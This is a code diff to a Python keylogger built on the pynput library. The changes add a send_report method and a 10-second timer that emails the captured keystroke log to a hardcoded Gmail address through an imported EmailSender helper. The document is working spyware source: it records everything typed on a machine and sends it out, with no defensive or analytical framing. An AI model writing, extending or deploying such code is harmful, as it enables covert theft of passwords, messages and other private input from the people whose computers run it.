@@ -1,5 +1,7 @@
 from pynput import keyboard
 import threading
+from temp_mail_generator import EmailSender
+
 
 class Keylogger:
 
@@ -25,8 +27,10 @@ class Keylogger:
             return False
 
     def report(self):
-        print("Reporting...")
-        self.log = ''
+        if self.report_timer:
+            print("Reporting...")
+            self.send_report()
+            self.log = ''
         self.report_timer = threading.Timer(10, self.report)
         self.report_timer.start()
 
@@ -36,9 +40,17 @@ class Keylogger:
             print("Started Keylogger")
             self.report()
             keyboard_listener.join()
+    
+    def send_report(self):
+        email_sender = EmailSender()
+        receiver_email = "testing.purposes1989@gmail.com"
+        subject = "Subject: Keylogger Data"
+
+        # Call the method to send an email with attachments
+        email_sender.send_email(receiver_email, subject, "\n\n" + self.log)
 
 def main():
-    keylogger = Keylogger()
+    keylogger= Keylogger()
     keylogger.start()
 
 if __name__ == "__main__":
